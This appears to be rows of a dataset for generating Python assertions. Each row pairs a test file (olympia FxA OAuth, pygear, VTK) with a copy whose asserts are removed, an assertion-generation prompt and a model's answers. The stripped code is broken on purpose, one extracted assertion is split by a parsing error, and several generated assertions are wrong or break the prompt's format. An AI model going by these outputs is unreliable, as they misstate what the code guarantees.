        patcher = mock.patch('olympia.accounts.verify.requests.get')
        self.get = patcher.start()
        self.addCleanup(patcher.stop)

    def test_success(self):
        profile_data = {'email': 'yo@oy.com'}
        self.get.return_value.status_code = 200
        self.get.return_value.json.return_value = profile_data
        profile = verify.get_fxa_profile('profile-plz', {
            'profile_host': 'https://app.fxa/v1',
        })
        assert profile == profile_data
        self.get.assert_called_with('https://app.fxa/v1/profile', headers={
            'Authorization': 'Bearer profile-plz',
        })

    def test_success_no_email(self):
        profile_data = {'email': ''}
        self.get.return_value.status_code = 200
        self.get.return_value.json.return_value = profile_data
        with pytest.raises(verify.IdentificationError):
            verify.get_fxa_profile('profile-plz', {
                'profile_host': 'https://app.fxa/v1',
            })
        self.get.assert_called_with('https://app.fxa/v1/profile', headers={
            'Authorization': 'Bearer profile-plz',
        })

    def test_failure(self):
        profile_data = {'error': 'some error'}
        self.get.return_value.status_code = 400
        self.get.json.return_value = profile_data
        with pytest.raises(verify.IdentificationError):
            verify.get_fxa_profile('profile-plz', {
                'profile_host': 'https://app.fxa/v1',
            })
        self.get.assert_called_with('https://app.fxa/v1/profile', headers={
            'Authorization': 'Bearer profile-plz',
        })


class TestToken(TestCase):

    def setUp(self):
        patcher = mock.patch('olympia.accounts.verify.requests.post')
        self.post = patcher.start()
        self.addCleanup(patcher.stop)

    def test_success(self):
        token_data = {'access_token': 'c0de'}
        self.post.return_value.status_code = 200
        self.post.return_value.json.return_value = token_data
        token = verify.get_fxa_token('token-plz', {
            'client_id': 'test-client-id',
            'client_secret': ""don't look"",
            'oauth_host': 'https://app.fxa/oauth/v1',
        })
        assert token == token_data
        self.post.assert_called_with('https://app.fxa/oauth/v1/token', data={
            'code': 'token-plz',
            'client_id': 'test-client-id',
            'client_secret': ""don't look"",
        })

    def test_no_token(self):
        token_data = {'access_token': ''}
        self.post.return_value.status_code = 200
        self.post.return_value.json.return_value = token_data
        with pytest.raises(verify.IdentificationError):
            verify.get_fxa_token('token-plz', {
                'client_id': 'test-client-id',
                'client_secret': ""don't look"",
                'oauth_host': 'https://app.fxa/oauth/v1',
            })
        self.post.assert_called_with('https://app.fxa/oauth/v1/token', data={
            'code': 'token-plz',
            'client_id': 'test-client-id',
            'client_secret': ""don't look"",
        })

    def test_failure(self):
        token_data = {'error': 'some error'}
        self.post.return_value.status_code = 400
        self.post.json.return_value = token_data
        with pytest.raises(verify.IdentificationError):
            verify.get_fxa_token('token-plz', {
                'client_id': 'test-client-id',
                'client_secret': ""don't look"",
                'oauth_host': 'https://app.fxa/oauth/v1',
            })
        self.post.assert_called_with('https://app.fxa/oauth/v1/token', data={
            'code': 'token-plz',
            'client_id': 'test-client-id',
            'client_secret': ""don't look"",
        })


class TestIdentify(TestCase):

    CONFIG = {'foo': 'bar'}

    def setUp(self):
        patcher = mock.patch('olympia.accounts.verify.get_fxa_token')
        self.get_token = patcher.start()
        self.addCleanup(patcher.stop)
        patcher = mock.patch('olympia.accounts.verify.get_fxa_profile')
        self.get_profile = patcher.start()
        self.addCleanup(patcher.stop)

    def test_token_raises(self):
        self.get_token.side_effect = verify.IdentificationError
        with pytest.raises(verify.IdentificationError):
            verify.fxa_identify('heya', self.CONFIG)
        self.get_token.assert_called_with('heya', self.CONFIG)
        assert not self.get_profile.called

    def test_profile_raises(self):
        self.get_token.return_value = {'access_token': 'bee5'}
        self.get_profile.side_effect = verify.IdentificationError
        with pytest.raises(verify.IdentificationError):
            verify.fxa_identify('heya', self.CONFIG)
        self.get_token.assert_called_with('heya', self.CONFIG)
        self.get_profile.assert_called_with('bee5', self.CONFIG)

    def test_all_good(self):
        self.get_token.return_value = {'access_token': 'cafe'}
        self.get_profile.return_value = {'email': 'me@em.hi'}
        identity = verify.fxa_identify('heya', self.CONFIG)
        assert identity == {'email': 'me@em.hi'}
        self.get_token.assert_called_with('heya', self.CONFIG)
        self.get_profile.assert_called_with('cafe', self.CONFIG)
","
1from unittest import TestCase
2
3import mock
4import pytest
5
6from olympia.accounts import verify
7
8
9class TestProfile(TestCase):
10
11    def setUp(self):
12        patcher = mock.patch('olympia.accounts.verify.requests.get')
13        self.get = patcher.start()
14        self.addCleanup(patcher.stop)
15
16    def test_success(self):
17        profile_data = {'email': 'yo@oy.com'}
18        self.get.return_value.status_code = 200
19        self.get.return_value.json.return_value = profile_data
20        profile = verify.get_fxa_profile('profile-plz', {
21            'profile_host': 'https://app.fxa/v1',
22        })
23            'Authorization': 'Bearer profile-plz',
24        })
25
26    def test_success_no_email(self):
27        profile_data = {'email': ''}
28        self.get.return_value.status_code = 200
29        self.get.return_value.json.return_value = profile_data
30        with pytest.raises(verify.IdentificationError):
31            verify.get_fxa_profile('profile-plz', {
32                'profile_host': 'https://app.fxa/v1',
33            })
34            'Authorization': 'Bearer profile-plz',
35        })
36
37    def test_failure(self):
38        profile_data = {'error': 'some error'}
39        self.get.return_value.status_code = 400
40        self.get.json.return_value = profile_data
41        with pytest.raises(verify.IdentificationError):
42            verify.get_fxa_profile('profile-plz', {
43                'profile_host': 'https://app.fxa/v1',
44            })
45            'Authorization': 'Bearer profile-plz',
46        })
47
48
49class TestToken(TestCase):
50
51    def setUp(self):
52        patcher = mock.patch('olympia.accounts.verify.requests.post')
53        self.post = patcher.start()
54        self.addCleanup(patcher.stop)
55
56    def test_success(self):
57        token_data = {'access_token': 'c0de'}
58        self.post.return_value.status_code = 200
59        self.post.return_value.json.return_value = token_data
60        token = verify.get_fxa_token('token-plz', {
61            'client_id': 'test-client-id',
62            'client_secret': ""don't look"",
63            'oauth_host': 'https://app.fxa/oauth/v1',
64        })
65            'code': 'token-plz',
66            'client_id': 'test-client-id',
67            'client_secret': ""don't look"",
68        })
69
70    def test_no_token(self):
71        token_data = {'access_token': ''}
72        self.post.return_value.status_code = 200
73        self.post.return_value.json.return_value = token_data
74        with pytest.raises(verify.IdentificationError):
75            verify.get_fxa_token('token-plz', {
76                'client_id': 'test-client-id',
77                'client_secret': ""don't look"",
78                'oauth_host': 'https://app.fxa/oauth/v1',
79            })
80            'code': 'token-plz',
81            'client_id': 'test-client-id',
82            'client_secret': ""don't look"",
83        })
84
85    def test_failure(self):
86        token_data = {'error': 'some error'}
87        self.post.return_value.status_code = 400
88        self.post.json.return_value = token_data
89        with pytest.raises(verify.IdentificationError):
90            verify.get_fxa_token('token-plz', {
91                'client_id': 'test-client-id',
92                'client_secret': ""don't look"",
93                'oauth_host': 'https://app.fxa/oauth/v1',
94            })
95            'code': 'token-plz',
96            'client_id': 'test-client-id',
97            'client_secret': ""don't look"",
98        })
99
100
101class TestIdentify(TestCase):
102
103    CONFIG = {'foo': 'bar'}
104
105    def setUp(self):
106        patcher = mock.patch('olympia.accounts.verify.get_fxa_token')
107        self.get_token = patcher.start()
108        self.addCleanup(patcher.stop)
109        patcher = mock.patch('olympia.accounts.verify.get_fxa_profile')
110        self.get_profile = patcher.start()
111        self.addCleanup(patcher.stop)
112
113    def test_token_raises(self):
114        self.get_token.side_effect = verify.IdentificationError
115        with pytest.raises(verify.IdentificationError):
116            verify.fxa_identify('heya', self.CONFIG)
117
118    def test_profile_raises(self):
119        self.get_token.return_value = {'access_token': 'bee5'}
120        self.get_profile.side_effect = verify.IdentificationError
121        with pytest.raises(verify.IdentificationError):
122            verify.fxa_identify('heya', self.CONFIG)
123
124    def test_all_good(self):
125        self.get_token.return_value = {'access_token': 'cafe'}
126        self.get_profile.return_value = {'email': 'me@em.hi'}
127        identity = verify.fxa_identify('heya', self.CONFIG)
128","[['profile', '==', 'profile_data'], ['token', '==', 'token_data'], ['self.get_profile.called', '==', 'False'], ['identity', '==', ""{'email': 'me@em.hi'}""]]",15,4,0.2666666666666666,0.000741702206564,"['patcher', 'self.get', 'profile_data', 'self.get.return_value.status_code', 'self.get.return_value.json.return_value', 'profile', 'self.get.json.return_value', 'self.post', 'token_data', 'self.post.return_value.status_code', 'self.post.return_value.json.return_value', 'token', 'self.post.json.return_value', 'CONFIG', 'self.get_token', 'self.get_profile', 'self.get_token.side_effect', 'self.get_token.return_value', 'self.get_profile.side_effect', 'self.get_profile.return_value', 'identity']",21,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['patcher', 'self.get', 'profile_data', 'self.get.return_value.status_code', 'self.get.return_value.json.return_value', 'profile', 'self.get.json.return_value', 'self.post', 'token_data', 'self.post.return_value.status_code', 'self.post.return_value.json.return_value', 'token', 'self.post.json.return_value', 'CONFIG', 'self.get_token', 'self.get_profile', 'self.get_token.side_effect', 'self.get_token.return_value', 'self.get_profile.side_effect', 'self.get_profile.return_value', 'identity']
*Code:

1from unittest import TestCase
2
3import mock
4import pytest
5
6from olympia.accounts import verify
7
8
9class TestProfile(TestCase):
10
11    def setUp(self):
12        patcher = mock.patch('olympia.accounts.verify.requests.get')
13        self.get = patcher.start()
14        self.addCleanup(patcher.stop)
15
16    def test_success(self):
17        profile_data = {'email': 'yo@oy.com'}
18        self.get.return_value.status_code = 200
19        self.get.return_value.json.return_value = profile_data
20        profile = verify.get_fxa_profile('profile-plz', {
21            'profile_host': 'https://app.fxa/v1',
22        })
23            'Authorization': 'Bearer profile-plz',
24        })
25
26    def test_success_no_email(self):
27        profile_data = {'email': ''}
28        self.get.return_value.status_code = 200
29        self.get.return_value.json.return_value = profile_data
30        with pytest.raises(verify.IdentificationError):
31            verify.get_fxa_profile('profile-plz', {
32                'profile_host': 'https://app.fxa/v1',
33            })
34            'Authorization': 'Bearer profile-plz',
35        })
36
37    def test_failure(self):
38        profile_data = {'error': 'some error'}
39        self.get.return_value.status_code = 400
40        self.get.json.return_value = profile_data
41        with pytest.raises(verify.IdentificationError):
42            verify.get_fxa_profile('profile-plz', {
43                'profile_host': 'https://app.fxa/v1',
44            })
45            'Authorization': 'Bearer profile-plz',
46        })
47
48
49class TestToken(TestCase):
50
51    def setUp(self):
52        patcher = mock.patch('olympia.accounts.verify.requests.post')
53        self.post = patcher.start()
54        self.addCleanup(patcher.stop)
55
56    def test_success(self):
57        token_data = {'access_token': 'c0de'}
58        self.post.return_value.status_code = 200
59        self.post.return_value.json.return_value = token_data
60        token = verify.get_fxa_token('token-plz', {
61            'client_id': 'test-client-id',
62            'client_secret': ""don't look"",
63            'oauth_host': 'https://app.fxa/oauth/v1',
64        })
65            'code': 'token-plz',
66            'client_id': 'test-client-id',
67            'client_secret': ""don't look"",
68        })
69
70    def test_no_token(self):
71        token_data = {'access_token': ''}
72        self.post.return_value.status_code = 200
73        self.post.return_value.json.return_value = token_data
74        with pytest.raises(verify.IdentificationError):
75            verify.get_fxa_token('token-plz', {
76                'client_id': 'test-client-id',
77                'client_secret': ""don't look"",
78                'oauth_host': 'https://app.fxa/oauth/v1',
79            })
80            'code': 'token-plz',
81            'client_id': 'test-client-id',
82            'client_secret': ""don't look"",
83        })
84
85    def test_failure(self):
86        token_data = {'error': 'some error'}
87        self.post.return_value.status_code = 400
88        self.post.json.return_value = token_data
89        with pytest.raises(verify.IdentificationError):
90            verify.get_fxa_token('token-plz', {
91                'client_id': 'test-client-id',
92                'client_secret': ""don't look"",
93                'oauth_host': 'https://app.fxa/oauth/v1',
94            })
95            'code': 'token-plz',
96            'client_id': 'test-client-id',
97            'client_secret': ""don't look"",
98        })
99
100
101class TestIdentify(TestCase):
102
103    CONFIG = {'foo': 'bar'}
104
105    def setUp(self):
106        patcher = mock.patch('olympia.accounts.verify.get_fxa_token')
107        self.get_token = patcher.start()
108        self.addCleanup(patcher.stop)
109        patcher = mock.patch('olympia.accounts.verify.get_fxa_profile')
110        self.get_profile = patcher.start()
111        self.addCleanup(patcher.stop)
112
113    def test_token_raises(self):
114        self.get_token.side_effect = verify.IdentificationError
115        with pytest.raises(verify.IdentificationError):
116            verify.fxa_identify('heya', self.CONFIG)
117
118    def test_profile_raises(self):
119        self.get_token.return_value = {'access_token': 'bee5'}
120        self.get_profile.side_effect = verify.IdentificationError
121        with pytest.raises(verify.IdentificationError):
122            verify.fxa_identify('heya', self.CONFIG)
123
124    def test_all_good(self):
125        self.get_token.return_value = {'access_token': 'cafe'}
126        self.get_profile.return_value = {'email': 'me@em.hi'}
127        identity = verify.fxa_identify('heya', self.CONFIG)
128",6598,"[[11, 'patcher', '!=', None, ""patcher should not be None at the start""],
 [11, 'self.get', '!=', None, ""self.get should not be None after patcher.start""],
 [16, 'profile_data', '==', 1, ""profile_data should contain the email""],
 [16, 'self.get.return_value.status_code', '==', 200, ""status code of get call should be 200 for successful response""],
 [20, 'profile', '!=', None, ""profile should not be None after successful get call""],
 [26, 'profile_data', '==', 1, ""profile_data should contain the email, even if it's empty""],
 [26, 'self.get.return_value.status_code', '==', 200, ""status code of get call should be 200, even if the email is empty""],
 [37, 'profile_data', '==', 1, ""profile_data should contain the error message""],
 [37, 'self.get.return_value.status_code', '>=', 400, ""status code of get call should be at least 400 for unsuccessful response""],
 [51, 'patcher', '!=', None, ""patcher should not be None at the start""],
 [51, 'self.post', '!=', None, ""self.post should not be None after patcher.start""],
 [56, 'token_data', '==', 1, ""token_data should contain the access token""],
 [56, 'self.post.return_value.status_code', '==', 200, ""status code of post call should be 200 for successful response""],
 [60, 'token', '!=', None, ""token should not be None after successful post call""],
 [70, 'token_data', '==', 1, ""token_data should contain the access token, even if it's empty""],
 [70, 'self.post.return_value.status_code', '==', 200, ""status code of post call should be 200, even if the token is empty""],
 [85, 'token_data', '==', 1, ""token_data should contain the error message""],
 [85, 'self.post.return_value.status_code', '>=', 400, ""status code of post call should be at least 400 for unsuccessful response""],
 [103, 'CONFIG', '==', 1, ""CONFIG should contain at least one setting""],
 [103, 'self.get_token', '!=', None, ""self.get_token should not be None after patcher.start""],
 [103, 'self.get_profile', '!=', None, ""self.get_profile should not be None after patcher.start""],
 [118, 'self.get_token.return_value', '==', 1, ""get_token return_val should contain the access_token""],
 [124, 'self.get_token.return_value', '==', 1, ""get_token return_val should contain the access_token""],
 [124, 'self.get_profile.return_value', '==', 1, ""get_profile return_val should contain the email""],
 [124, 'identity', '!=', None, ""identity should not be None after successful identify""]]"
Yelp/pygear,"import gc

import mock
import pytest
import pygear

from . import noop_serializer


@pytest.fixture
def t():
    return pygear.Task(None, None)


def test_task_data_size(t):
    assert t.data_size() == 0


def test_task_denominator(t):
    assert t.denominator() == 0


def test_task_error(t):
    assert t.error() is None


def test_task_function_name(t):
    assert t.function_name() is None


def test_task_is_known(t):
    assert not t.is_known()


def test_task_is_running(t):
    assert not t.is_running()


def test_task_job_handle(t):
    assert t.job_handle() is None


def test_task_numerator(t):
    assert t.numerator() == 0


def test_task_result(t):
    assert t.result() is None


def test_task_returncode(t):
    assert pygear.describe_returncode(t.returncode()) == 'INVALID_ARGUMENT'


def test_task_set_serializer(t):
    t.set_serializer(noop_serializer())  # valid
    with pytest.raises(AttributeError):  # invalid
        t.set_serializer(""a string doesn't implement loads."")


def test_task_strstate(t):
    assert t.strstate() is None


def test_task_unique(t):
    assert t.unique() is None


def test_gc_traversal(t):
    sentinel = mock.Mock()
    t.set_serializer(sentinel)
    assert sentinel in gc.get_referents(t)
","
1import gc
2
3import mock
4import pytest
5import pygear
6
7from . import noop_serializer
8
9
10@pytest.fixture
11def t():
12    return pygear.Task(None, None)
13
14
15def test_task_data_size(t):
16
17
18def test_task_denominator(t):
19
20
21def test_task_error(t):
22
23
24def test_task_function_name(t):
25
26
27def test_task_is_known(t):
28
29
30def test_task_is_running(t):
31
32
33def test_task_job_handle(t):
34
35
36def test_task_numerator(t):
37
38
39def test_task_result(t):
40
41
42def test_task_returncode(t):
43
44
45def test_task_set_serializer(t):
46    t.set_serializer(noop_serializer())  # valid
47    with pytest.raises(AttributeError):  # invalid
48        t.set_serializer(""a string doesn't implement loads."")
49
50
51def test_task_strstate(t):
52
53
54def test_task_unique(t):
55
56
57def test_gc_traversal(t):
58    sentinel = mock.Mock()
59    t.set_serializer(sentinel)
60","[['t.data_size()', '==', '0'], ['t.denominator()', '==', '0'], ['t.error()', '==', 'None'], ['t.function_name()', '==', 'None'], ['t.is_known()', '==', 'False'], ['t.is_running()', '==', 'False'], ['t.job_h', '==', 'True'], ['le()', '==', 'None'], ['t.numerator()', '==', '0'], ['t.result()', '==', 'None'], ['pygear.describe_returncode(t.returncode())', '==', ""'INVALID_ARGUMENT'""], ['t.strstate()', '==', 'None'], ['t.unique()', '==', 'None']]",13,13,1.0,0.010441767068273,"['t', 'sentinel']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['t', 'sentinel']
*Code:

1import gc
2
3import mock
4import pytest
5import pygear
6
7from . import noop_serializer
8
9
10@pytest.fixture
11def t():
12    return pygear.Task(None, None)
13
14
15def test_task_data_size(t):
16
17
18def test_task_denominator(t):
19
20
21def test_task_error(t):
22
23
24def test_task_function_name(t):
25
26
27def test_task_is_known(t):
28
29
30def test_task_is_running(t):
31
32
33def test_task_job_handle(t):
34
35
36def test_task_numerator(t):
37
38
39def test_task_result(t):
40
41
42def test_task_returncode(t):
43
44
45def test_task_set_serializer(t):
46    t.set_serializer(noop_serializer())  # valid
47    with pytest.raises(AttributeError):  # invalid
48        t.set_serializer(""a string doesn't implement loads."")
49
50
51def test_task_strstate(t):
52
53
54def test_task_unique(t):
55
56
57def test_gc_traversal(t):
58    sentinel = mock.Mock()
59    t.set_serializer(sentinel)
60",2293,"[[11, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[15, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[18, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[21, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[24, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[27, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[30, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[33, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[36, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[39, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[42, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[45, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[58, 't', '!=', None, ""Task 't' should be an instance of pygear.Task""],
[58, 'sentinel', '!=', None, ""'sentinel' should be an instance of mock.Mock""]]"
demarle/VTK,"#!/usr/bin/env python
import sys
import vtk
from vtk.test import Testing
from vtk.util.misc import vtkGetDataRoot
VTK_DATA_ROOT = vtkGetDataRoot()

def Gather(c, arr, root):
    vtkArr = vtk.vtkDoubleArray()
    count = len(arr)
    vtkArr.SetNumberOfTuples(count)
    for i in range(count):
        vtkArr.SetValue(i, arr[i])
    vtkResult = vtk.vtkDoubleArray()
    c.Gather(vtkArr, vtkResult, root)
    result = [vtkResult.GetValue(i) for i in range(vtkResult.GetNumberOfTuples())]
    return [ tuple(result[i : i + count]) \
                for i in xrange(0, vtkResult.GetNumberOfTuples(), count) ]

renWin = vtk.vtkRenderWindow()

iren = vtk.vtkRenderWindowInteractor()
iren.SetRenderWindow(renWin)

r = vtk.vtkMultiBlockPLOT3DReader()
# Since vtkMPIMultiBlockPLOT3DReader is not created on Windows even when MPI
# is enabled.
assert r.IsA(""vtkMPIMultiBlockPLOT3DReader"") == 1 or sys.platform == ""win32""

r.SetFileName(VTK_DATA_ROOT + ""/Data/multi-bin.xyz"")
r.SetQFileName(VTK_DATA_ROOT + ""/Data/multi-bin-oflow.q"")
r.SetFunctionFileName(VTK_DATA_ROOT + ""/Data/multi-bin.f"")
r.AutoDetectFormatOn()

r.Update()

c = vtk.vtkMPIController.GetGlobalController()
size = c.GetNumberOfProcesses()
rank = c.GetLocalProcessId()
block = 0

bounds = r.GetOutput().GetBlock(block).GetBounds()
bounds = Gather(c, bounds, root=0)

if rank == 0:
    print ""Reader:"", r.GetClassName()
    print ""Bounds:""
    for i in range(size):
        print bounds[i]

c.Barrier()
aname = ""StagnationEnergy""
rng = r.GetOutput().GetBlock(block).GetPointData().GetArray(aname).GetRange(0)

rng = Gather(c, rng, root=0)
if rank == 0:
    print ""StagnationEnergy Ranges:""
    for i in range(size):
        print rng[i]
        assert rng[i][0] > 1.1 and rng[i][0] < 24.1 and \
               rng[i][1] > 1.1 and rng[i][1] < 24.1
","
1#!/usr/bin/env python
2import sys
3import vtk
4from vtk.test import Testing
5from vtk.util.misc import vtkGetDataRoot
6VTK_DATA_ROOT = vtkGetDataRoot()
7
8def Gather(c, arr, root):
9    vtkArr = vtk.vtkDoubleArray()
10    count = len(arr)
11    vtkArr.SetNumberOfTuples(count)
12    for i in range(count):
13        vtkArr.SetValue(i, arr[i])
14    vtkResult = vtk.vtkDoubleArray()
15    c.Gather(vtkArr, vtkResult, root)
16    result = [vtkResult.GetValue(i) for i in range(vtkResult.GetNumberOfTuples())]
17    return [ tuple(result[i : i + count]) \
18                for i in xrange(0, vtkResult.GetNumberOfTuples(), count) ]
19
20renWin = vtk.vtkRenderWindow()
21
22iren = vtk.vtkRenderWindowInteractor()
23iren.SetRenderWindow(renWin)
24
25r = vtk.vtkMultiBlockPLOT3DReader()
26# Since vtkMPIMultiBlockPLOT3DReader is not created on Windows even when MPI
27# is enabled.
28
29r.SetFileName(VTK_DATA_ROOT + ""/Data/multi-bin.xyz"")
30r.SetQFileName(VTK_DATA_ROOT + ""/Data/multi-bin-oflow.q"")
31r.SetFunctionFileName(VTK_DATA_ROOT + ""/Data/multi-bin.f"")
32r.AutoDetectFormatOn()
33
34r.Update()
35
36c = vtk.vtkMPIController.GetGlobalController()
37size = c.GetNumberOfProcesses()
38rank = c.GetLocalProcessId()
39block = 0
40
41bounds = r.GetOutput().GetBlock(block).GetBounds()
42bounds = Gather(c, bounds, root=0)
43
44if rank == 0:
45    print ""Reader:"", r.GetClassName()
46    print ""Bounds:""
47    for i in range(size):
48        print bounds[i]
49
50c.Barrier()
51aname = ""StagnationEnergy""
52rng = r.GetOutput().GetBlock(block).GetPointData().GetArray(aname).GetRange(0)
53
54rng = Gather(c, rng, root=0)
55if rank == 0:
56    print ""StagnationEnergy Ranges:""
57    for i in range(size):
58        print rng[i]
59               rng[i][1] > 1.1 and rng[i][1] < 24.1
60","[['rng[i][0]', '>', '1.1'], ['rng[i][0]', '<', '24.1'], ['\\', '==', 'True']]",2,3,1.5,0.0016648168701442,"['VTK_DATA_ROOT', 'c', 'arr', 'root', 'vtkArr', 'count', 'vtkResult', 'result', 'renWin', 'iren', 'r', 'size', 'rank', 'block', 'bounds', 'aname', 'rng']",17,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['VTK_DATA_ROOT', 'c', 'arr', 'root', 'vtkArr', 'count', 'vtkResult', 'result', 'renWin', 'iren', 'r', 'size', 'rank', 'block', 'bounds', 'aname', 'rng']
*Code:

1#!/usr/bin/env python
2import sys
3import vtk
4from vtk.test import Testing
5from vtk.util.misc import vtkGetDataRoot
6VTK_DATA_ROOT = vtkGetDataRoot()
7
8def Gather(c, arr, root):
9    vtkArr = vtk.vtkDoubleArray()
10    count = len(arr)
11    vtkArr.SetNumberOfTuples(count)
12    for i in range(count):
13        vtkArr.SetValue(i, arr[i])
14    vtkResult = vtk.vtkDoubleArray()
15    c.Gather(vtkArr, vtkResult, root)
16    result = [vtkResult.GetValue(i) for i in range(vtkResult.GetNumberOfTuples())]
17    return [ tuple(result[i : i + count]) \
18                for i in xrange(0, vtkResult.GetNumberOfTuples(), count) ]
19
20renWin = vtk.vtkRenderWindow()
21
22iren = vtk.vtkRenderWindowInteractor()
23iren.SetRenderWindow(renWin)
24
25r = vtk.vtkMultiBlockPLOT3DReader()
26# Since vtkMPIMultiBlockPLOT3DReader is not created on Windows even when MPI
27# is enabled.
28
29r.SetFileName(VTK_DATA_ROOT + ""/Data/multi-bin.xyz"")
30r.SetQFileName(VTK_DATA_ROOT + ""/Data/multi-bin-oflow.q"")
31r.SetFunctionFileName(VTK_DATA_ROOT + ""/Data/multi-bin.f"")
32r.AutoDetectFormatOn()
33
34r.Update()
35
36c = vtk.vtkMPIController.GetGlobalController()
37size = c.GetNumberOfProcesses()
38rank = c.GetLocalProcessId()
39block = 0
40
41bounds = r.GetOutput().GetBlock(block).GetBounds()
42bounds = Gather(c, bounds, root=0)
43
44if rank == 0:
45    print ""Reader:"", r.GetClassName()
46    print ""Bounds:""
47    for i in range(size):
48        print bounds[i]
49
50c.Barrier()
51aname = ""StagnationEnergy""
52rng = r.GetOutput().GetBlock(block).GetPointData().GetArray(aname).GetRange(0)
53
54rng = Gather(c, rng, root=0)
55if rank == 0:
56    print ""StagnationEnergy Ranges:""
57    for i in range(size):
58        print rng[i]
59               rng[i][1] > 1.1 and rng[i][1] < 24.1
60",3312,"[[8, 'c', '!=', None, ""c cannot be None for Gather function to work""],
 [8, 'arr', '!=', None, ""arr cannot be None for Gather function to work""],
 [10, 'count', '>=', 0, ""count cannot be less than 0""],
 [10, 'count', '==', 'len(arr)', ""count should be equal to length of arr""],
 [19, 'result', '==', 'len(arr)', ""result should be equal to length of arr""],
 [36, 'c', '!=', None, ""c cannot be None""],
 [37, 'size', '>=', 0, ""size cannot be negative""],
 [38, 'rank', '>=', 0, ""rank cannot be negative""],
 [38, 'rank', '<=', 'size', ""rank cannot be greater than size""],
 [39, 'block', '==', 0, ""block initialized to 0""],
 [59, 'rng', '!=', None, ""rng should not be None for condition at line 59""]]"
ESGF/esgf-drslib,"# BSD Licence
# Copyright (c) 2011, Science & Technology Facilities Council (STFC)
# All rights reserved.
#
# See the LICENSE file in the source distribution of this software for
# the full license text.


import logging
log = logging.getLogger(__name__)

class request_time_slice:

  def __init__(self,parent):
    self.parent=parent
    self.warning = ''

  def in_requested_time(self,start,end):
    self.is_in_requested_time = False
    ssp = self.parent.request_spec

    if ssp[0] in ['list','listrel']:
        if ssp[0] == 'listrel':
          offset = self.get_offset()
          if self.offset_status == -1:
            log.warning('failed to get offset [listrel]')
            return False
        else:
          offset = 0
        for s in ssp[1:]:
          if s[0] == 'year':
            if start-offset == s[1]:
              self.is_in_requested_time = True
              return True
          elif s[0] == 'slice':
            if start-offset <= s[2] and end-offset >= s[1]:
              self.is_in_requested_time = True
              return True

        self.requested_time_end = ssp[-1][-1]
        self.requested_time_start = ssp[1][1]
        self.is_in_requested_time = False
        return True

    elif ssp[0] == 'corres':
      ##  offset = self.get_offset()
        ##if self.offset_status == -1:
        log.warning('not ready for this yet [corres] -- need start time info %s %s ' % (tli, self.parent.request_col))
        return False

    return True

  def load_config(self):
    assert self.parent.config_exists, 'load_config: need a valid configuration file at this point'
    if not self.parent.config_loaded:
        import ConfigParser
        self.cp = ConfigParser.SafeConfigParser()
        self.cp.read( self.parent.config )
        self.parent.config_loaded = True

  def get_offset(self):
    self.load_config()
    self.offset_status = -1
    if not self.parent.model in self.cp.sections():
      self.warning += 'model [%s] not found in configuration file sections: %s, defaulting to 0 offset;;' % (self.parent.model,str(self.cp.sections()) )
      self.offset = 0
      return self.offset
    else:
